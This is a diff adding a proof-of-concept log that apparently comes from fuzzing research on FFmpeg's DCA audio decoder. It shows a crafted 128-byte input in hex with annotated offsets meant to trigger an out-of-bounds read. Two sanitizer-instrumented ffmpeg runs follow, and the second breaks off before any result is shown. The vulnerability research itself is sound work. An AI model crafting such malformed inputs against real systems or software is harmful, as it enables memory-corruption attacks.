@@ -1,0 +1,189 @@
+[*] Generating crafted DCA input...
+[+] Generated /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca  (128 bytes)
+[+] Hex dump:
+       0: 7f fe 80 01 fc 1c 07 f2 74 e2 d1 00 00 08 00 00  ........t.......
+      16: 00 00 00 00 00 00 00 2d b6 db 6d ff ff ff ff ff  .......-..m.....
+      32: ff ff ff ff ff ff ff ff ff ff 00 00 00 00 00 00  ................
+      48: 00 00 00 00 00 00 00 00 1f ff e0 00 9a 11 05 a0  ................
+      64: 48 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  H...............
+      80: 47 00 4a 03 35 f0 00 f0 00 00 01 f0 f3 bc 14 20  G.J.5.......... 
+      96: 00 00 00 00 0b 7f ff ff c0 00 00 03 ff fc 00 00  ................
+     112: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+[+] Key offsets:
+    byte  0: DCA sync word (0x7FFE8001)
+    byte 60: REV1AUX sync word (0x9A1105A0) → prim_dmix_embedded=1
+    byte 80: XXCH sync word (0x47004A03) → xxch_mask_nbits=32
+    byte 94: XXCH channel set → xxch_spkr_mask=0x80000000 (bit 31 = RSV4)
+[+] Input: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca
+
+[*] Run 1: default channel order (force DTS/DCA demuxer)
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Splitting the commandline.
+Reading option '-nostdin' ... matched as option 'stdin' (enable or disable interaction on standard input) with argument 0.
+Reading option '-loglevel' ... matched as option 'loglevel' (set logging level) with argument 'debug'.
+Reading option '-f' ... matched as option 'f' (force container format (auto-detected otherwise)) with argument 'dts'.
+Reading option '-i' ... matched as input url with argument '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca'.
+Reading option '-f' ... matched as option 'f' (force container format (auto-detected otherwise)) with argument 'null'.
+Reading option '/dev/null' ... matched as output url.
+Finished splitting the commandline.
+Parsing a group of options: global .
+Applying option nostdin (enable or disable interaction on standard input) with argument 0.
+Applying option loglevel (set logging level) with argument debug.
+Successfully parsed a group of options.
+Parsing a group of options: input url /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca.
+Applying option f (force container format (auto-detected otherwise)) with argument dts.
+Successfully parsed a group of options.
+Opening an input file: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca.
+[in#0 @ 0x517000000080] Opening '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca' for reading
+[file @ 0x5120000001c0] Setting default whitelist 'file,crypto,data'
+[in#0/dts @ 0x517000000080] Before avformat_find_stream_info() pos: 0 bytes read:0 seeks:0 nb_streams:1
+Transform tree:
+    mdct_inv_float_c - type: mdct_float, len: 32, factors[2]: [2, any], flags: [unaligned, out_of_place, inv_only]
+        fft16_ns_float_c - type: fft_float, len: 16, factor: 2, flags: [unaligned, inplace, out_of_place, preshuf]
+Transform tree:
+    mdct_inv_float_c - type: mdct_float, len: 64, factors[2]: [2, any], flags: [unaligned, out_of_place, inv_only]
+        fft32_ns_float_c - type: fft_float, len: 32, factor: 2, flags: [unaligned, inplace, out_of_place, preshuf]
+[in#0/dts @ 0x517000000080] Estimating duration from bitrate, this may be inaccurate
+[in#0/dts @ 0x517000000080] After avformat_find_stream_info() pos: 128 bytes read:128 seeks:0 frames:1
+Input #0, dts, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca':
+  Duration: 00:00:00.00, start: 0.000000, bitrate: 224 kb/s
+  Stream #0:0, 1, 1/90000: Audio: dts (dca) (DTS-ES), 48000 Hz, 5.0(side), fltp, 224 kb/s
+Successfully opened the file.
+Parsing a group of options: output url /dev/null.
+Applying option f (force container format (auto-detected otherwise)) with argument null.
+Successfully parsed a group of options.
+Opening an output file: /dev/null.
+[out#0/null @ 0x511000000e00] No explicit maps, mapping streams automatically...
+[aost#0:0/pcm_s16le @ 0x517000001580] Created audio stream from input stream 0:0
+Transform tree:
+    mdct_inv_float_c - type: mdct_float, len: 32, factors[2]: [2, any], flags: [unaligned, out_of_place, inv_only]
+        fft16_ns_float_c - type: fft_float, len: 16, factor: 2, flags: [unaligned, inplace, out_of_place, preshuf]
+Transform tree:
+    mdct_inv_float_c - type: mdct_float, len: 64, factors[2]: [2, any], flags: [unaligned, out_of_place, inv_only]
+        fft32_ns_float_c - type: fft_float, len: 32, factor: 2, flags: [unaligned, inplace, out_of_place, preshuf]
+Successfully opened the file.
+Stream mapping:
+  Stream #0:0 -> #0:0 (dts (dca) -> pcm_s16le (native))
+[aost#0:0/pcm_s16le @ 0x517000001580] Starting thread...
+[af#0:0 @ 0x51a000000680] Starting thread...
+[aist#0:0/dts @ 0x514000000240] [dec:dca @ 0x513000000ac0] Starting thread...
+[in#0/dts @ 0x513000000200] Starting thread...
+[in#0/dts @ 0x513000000200] EOF while reading input
+[in#0/dts @ 0x513000000200] Terminating thread with success
+[aist#0:0/dts @ 0x514000000240] [dec:dca @ 0x513000000ac0] Decoder thread received EOF packet
+[aist#0:0/dts @ 0x514000000240] [dec:dca @ 0x513000000ac0] Decoder returned EOF, finishing
+detected 256 logical cores
+[aist#0:0/dts @ 0x514000000240] [dec:dca @ 0x513000000ac0] Terminating thread with success
+[graph_-1_in_0:0 @ 0x51100001a300] Setting 'time_base' to value '1/48000'
+[graph_-1_in_0:0 @ 0x51100001a300] Setting 'sample_rate' to value '48000'
+[graph_-1_in_0:0 @ 0x51100001a300] Setting 'sample_fmt' to value 'fltp'
+[graph_-1_in_0:0 @ 0x51100001a300] Setting 'channel_layout' to value '5.0(side)'
+[graph_-1_in_0:0 @ 0x51100001a300] tb:1/48000 samplefmt:fltp samplerate:48000 chlayout:5.0(side)
+[format_out_#0:0 @ 0x51100001a800] Setting 'sample_fmts' to value 's16'
+Filter 'Parsed_anull_0' formats:
+  in[0] 'default':
+    Channel layouts: 
+    Sample rates: 
+    Sample formats: u8 s16 s32 flt dbl u8p s16p s32p fltp dblp s64 s64p dsd
+  out[0] 'default':
+    Channel layouts: 
+    Sample rates: 
+    Sample formats: u8 s16 s32 flt dbl u8p s16p s32p fltp dblp s64 s64p dsd
+Filter 'graph_-1_in_0:0' formats:
+  out[0] 'default':
+    Channel layouts: 5.0(side)
+    Sample rates: 48000
+    Sample formats: fltp
+Filter 'out_#0:0' formats:
+  in[0] 'default':
+    Channel layouts: 
+    Sample rates: 
+    Sample formats: u8 s16 s32 flt dbl u8p s16p s32p fltp dblp s64 s64p dsd
+Filter 'format_out_#0:0' formats:
+  in[0] 'default':
+    Channel layouts: 
+    Sample rates: 
+    Sample formats: s16
+  out[0] 'default':
+    Channel layouts: 
+    Sample rates: 
+    Sample formats: s16
+[format_out_#0:0 @ 0x51100001a800] auto-inserting filter 'auto_aresample_0' between the filter 'Parsed_anull_0' and the filter 'format_out_#0:0'
+[AVFilterGraph @ 0x510000020040] query_formats: 4 queried, 10 merged, 15 already done, 0 delayed
+[auto_aresample_0 @ 0x51100001a940] [SWR @ 0x531000050800] Using fltp internally between filters
+[auto_aresample_0 @ 0x51100001a940] ch:5 chl:5.0(side) fmt:fltp r:48000Hz -> ch:5 chl:5.0(side) fmt:s16 r:48000Hz
+Output #0, null, to '/dev/null':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0, 0, 1/48000: Audio: pcm_s16le, 48000 Hz, 5.0(side), s16, 3840 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000e00] Starting thread...
+[out_#0:0 @ 0x51100001a580] EOF on sink link out_#0:0:default.
+[af#0:0 @ 0x51a000000680] Filtergraph returned EOF, finishing
+[af#0:0 @ 0x51a000000680] All consumers returned EOF
+[aost#0:0/pcm_s16le @ 0x517000001580] [enc:pcm_s16le @ 0x511000001300] Encoder thread received EOF
+[aost#0:0/pcm_s16le @ 0x517000001580] Terminating thread with success
+[out#0/null @ 0x511000000e00] All streams finished
+[out#0/null @ 0x511000000e00] Terminating thread with success
+[af#0:0 @ 0x51a000000680] Terminating thread with success
+[out#0/null @ 0x511000000e00] Output file #0 (/dev/null):
+[out#0/null @ 0x511000000e00]   Output stream #0:0 (audio): 1 frames encoded (256 samples); 1 packets muxed (2560 bytes); 
+[out#0/null @ 0x511000000e00]   Total: 1 packets (2560 bytes) muxed
+[out#0/null @ 0x511000000e00] video:0KiB audio:2KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+size=N/A time=00:00:00.00 bitrate=N/A speed=0.409x elapsed=0:00:00.01    
+[in#0/dts @ 0x513000000200] Input file #0 (/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca):
+[in#0/dts @ 0x513000000200]   Input stream #0:0 (audio): 1 packets read (128 bytes); 1 frames decoded; 0 decode errors (256 samples); 
+[in#0/dts @ 0x513000000200]   Total: 1 packets (128 bytes) demuxed
+[AVIOContext @ 0x5130000003c0] Statistics: 128 bytes read, 0 seeks
+
+Exiting with exit code 0
+
+[*] Run 2: -channel_order coded  (targets dca2wav[31] OOB)
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Splitting the commandline.
+Reading option '-nostdin' ... matched as option 'stdin' (enable or disable interaction on standard input) with argument 0.
+Reading option '-loglevel' ... matched as option 'loglevel' (set logging level) with argument 'debug'.
+Reading option '-channel_order' ... matched as AVOption 'channel_order' with argument 'coded'.
+Reading option '-f' ... matched as option 'f' (force container format (auto-detected otherwise)) with argument 'dts'.
+Reading option '-i' ... matched as input url with argument '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca'.
+Reading option '-f' ... matched as option 'f' (force container format (auto-detected otherwise)) with argument 'null'.
+Reading option '/dev/null' ... matched as output url.
+Finished splitting the commandline.
+Parsing a group of options: global .
+Applying option nostdin (enable or disable interaction on standard input) with argument 0.
+Applying option loglevel (set logging level) with argument debug.
+Successfully parsed a group of options.
+Parsing a group of options: input url /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca.
+Applying option f (force container format (auto-detected otherwise)) with argument dts.
+Successfully parsed a group of options.
+Opening an input file: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca.
+[in#0 @ 0x517000000080] Opening '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dcadec_c/vuln_001_input.dca' for reading
+[file @ 0x5120000001c0] Setting default whitelist 'file,crypto,data'
+[in#0/dts @ 0x517000000080] Before avformat_find_stream_info() pos: 0 bytes read:0 seeks:0 nb_streams:1
+Transform tree:
+    mdct_inv_float_c - type: mdct_float, len: 32, factors[2]: [2, any], flags: [unaligned, out_of_place, inv_only]
+        fft16_ns_float_c - type: fft_float, len: 16, factor: 2, flags: [unaligned, inplace, out_of_place, preshuf]
+Transform tree:
+    mdct_inv_float_c - type: mdct_float, len: 64, factors[2]: [2, any], flags: [unaligned, out_of_place, inv_only]
+        fft32_ns_float_c - type: fft_float, len: 32, factor: 2, flags: [unaligned, inplace, out_of_place, preshuf]
+
+[*] Done.
